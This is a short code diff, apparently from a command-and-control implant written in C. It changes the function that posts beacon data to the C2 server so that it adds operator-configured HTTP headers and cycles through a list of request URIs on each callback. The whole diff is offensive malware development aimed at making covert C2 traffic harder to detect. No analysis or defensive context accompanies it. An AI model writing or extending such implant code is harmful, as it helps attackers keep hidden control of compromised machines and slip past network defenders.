@@ -45,6 +45,11 @@ int http_post(const char* host, int port, const char* uri, int secure,
     headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
     headers = curl_slist_append(headers, ua_header);
 
+    for (int i = 0; i < g_config.http_header_count; i++) {
+        if (g_config.http_headers[i])
+            headers = curl_slist_append(headers, g_config.http_headers[i]);
+    }
+
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_POST, 1L);
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
@@ -94,8 +99,13 @@ int http_post(const char* host, int port, const char* uri, int secure,
     return 0;
 }
 
+static unsigned int g_uri_idx = 0;
+
 int http_c2_post(const uint8_t* body, size_t body_len,
                  uint8_t** resp_out, size_t* resp_len_out) {
-    return http_post(g_config.host, g_config.port, g_config.uri,
+    const char* uri = "/";
+    if (g_config.uri_count > 0)
+        uri = g_config.uris[g_uri_idx++ % (unsigned int)g_config.uri_count];
+    return http_post(g_config.host, g_config.port, uri,
                      g_config.secure, body, body_len, resp_out, resp_len_out);
 }
